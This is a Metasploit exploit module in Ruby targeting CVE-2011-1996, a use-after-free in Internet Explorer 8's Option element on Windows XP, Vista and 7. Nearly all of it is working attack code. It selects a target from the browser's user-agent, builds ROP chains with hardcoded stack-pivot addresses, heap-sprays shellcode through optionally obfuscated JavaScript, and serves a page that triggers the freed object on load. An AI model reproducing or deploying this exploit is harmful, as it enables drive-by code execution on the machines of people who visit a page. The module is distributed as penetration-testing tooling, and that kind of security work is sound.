# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb


  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Microsoft Internet Explorer Option Element Use-After-Free",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in Microsoft Internet Explorer.  A memory
        corruption may occur when the Option cache isn&#039;t updated properly, which allows
        other JavaScript methods to access a deleted Option element, and results in code
        execution under the context of the user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Ivan Fratric&#039;,  #Initial discovery
          &#039;juan vazquez&#039;,  #Metasploit
          &#039;sinn3r&#039;         #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2011-1996&#039; ],
          [ &#039;MSB&#039;, &#039;MS11-081&#039; ],
          [ &#039;URL&#039;, &#039;http://ifsec.blogspot.com/2011/10/internet-explorer-option-element-remote.html&#039; ],
          [ &#039;URL&#039;, &#039;http://pastebin.com/YLH725Aj&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;StackAdjustment&#039; => -3500,
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 8 on Windows XP SP3&#039;, { &#039;Rop&#039; => :msvcrt, &#039;Offset&#039; => 0x4f8, &#039;OffsetVirtualFunc&#039; => 502 } ],
          [ &#039;IE 8 on Windows Vista&#039;,  { &#039;Rop&#039; => :jre,    &#039;Offset&#039; => 0x4f8, &#039;OffsetVirtualFunc&#039; => 502 } ],
          [ &#039;IE 8 on Windows 7&#039;,      { &#039;Rop&#039; => :jre,    &#039;Offset&#039; => 0x4f8, &#039;OffsetVirtualFunc&#039; => 502 } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 11 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
      ], self.class)

  end

  def get_target(agent)
    #If the user is already specified by the user, we&#039;ll just use that
    return target if target.name != &#039;Automatic&#039;

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || &#039;&#039;
    ie = agent.scan(/MSIE (\d)/).flatten[0] || &#039;&#039;

    ie_name = "IE #{ie}"

    case nt
    when &#039;5.1&#039;
      os_name = &#039;Windows XP SP3&#039;
    when &#039;6.0&#039;
      os_name = &#039;Windows Vista&#039;
    when &#039;6.1&#039;
      os_name = &#039;Windows 7&#039;
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  def ie_heap_spray(my_target, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

    js = %Q|
    function heap_spray() {
      var heap_obj = new heapLib.ie(0x20000);
      var code = unescape("#{js_code}");
      var nops = unescape("#{js_nops}");
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
      var overflow = nops.substring(0, 10);
    }
    |

    js = heaplib(js, {:noobfu => true})

    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
      @heap_spray_func = js.sym("heap_spray")
    end

    return js
  end

  def get_payload(t, cli)
    code = payload.encoded

    # No rop. Just return the payload.
    return code if t[&#039;Rop&#039;].nil?

    # Both ROP chains generated by mona.py - See corelan.be
    case t[&#039;Rop&#039;]
    when :msvcrt
      print_status("Using msvcrt ROP")
      rop_payload = generate_rop_payload(&#039;msvcrt&#039;, "", {&#039;target&#039;=>&#039;xp&#039;})
      rop_payload << make_nops(t[&#039;OffsetVirtualFunc&#039;]-rop_payload.length)
      rop_payload << "\xeb\x04" # jmp $+6
      rop_payload << [0x77c15ed5].pack("V") # 0x0c0c0c0 # stackpivot => xchg eax, esp # ret
      rop_payload << code
    else
      print_status("Using JRE ROP")
      rop_payload = generate_rop_payload(&#039;java&#039;, &#039;&#039;)
      rop_payload << make_nops(t[&#039;OffsetVirtualFunc&#039;]-rop_payload.length)
      rop_payload << "\xeb\x08" # jmp $+10
      rop_payload << [0x7c348b05].pack("V") # stackpivot => xchg eax, esp # ret
      rop_payload << [0x7c348b05].pack("V") # stackpivot => xchg eax, esp # ret
      rop_payload << code
    end

    return rop_payload
  end

  def load_exploit_html(my_target, cli)
    @heap_spray_func = "heap_spray"
    p  = get_payload(my_target, cli)
    js = ie_heap_spray(my_target, p)


    #var fakeobj = unescape("%u0c0c%u0c0c");
    #call to 0c0c0c0c
    #eax ==> 0c0c0a14
    html = %Q|
    <!DOCTYPE html>
    <html>
    <head>
    <script>
    #{js}

    function ivan()
    {

      var fakeobj = unescape("%u0a14%u0c0c");
      fakeobj += unescape("%u4141%u4141");
      while (fakeobj.length <= 0x38/2) fakeobj += unescape("%u4141%u4141");

      var formobj, selobj, optobj;
      selobj = document.getElementById("select1");
      formobj = selobj.form;

      var imgarray = new Array();
      for(var j = 0; j < 500; j++) {
        imgarray.push(document.createElement("img"));
      }

      for(var i=0;i<5;i++) {
        optobj = document.createElement(&#039;option&#039;);
        optobj.text = "test";
        selobj.add(optobj);
      }

      selobj.innerText = "foo";

      for(var i = 0; i < imgarray.length; i++) {
        imgarray[i].title = fakeobj.substring(0, 0x38 / 2 - 1);
      }

      #{@heap_spray_func}();

      formobj.reset();
    }

    </script>
    </head>

    <body onload=&#039;ivan()&#039;>
    <form method="post">
    <select id="select1">
    </select>
    </form>
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target, cli)
    html = html.gsub(/^\t\t/, &#039;&#039;)
    print_status("Sending HTML...")
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
  end
end

